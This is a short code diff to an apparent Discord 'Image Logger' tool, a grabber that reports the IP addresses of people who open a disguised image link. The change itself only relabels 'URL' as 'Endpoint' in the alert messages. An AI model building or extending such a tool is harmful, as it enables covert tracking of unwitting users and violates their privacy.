@@ -75,7 +75,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A"):
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP:** `{ip}`\n**URL:** `{endpoint}`",
+            "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -122,7 +122,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A"):
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
-**URL:** {endpoint}
+**Endpoint:** `{endpoint}`
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
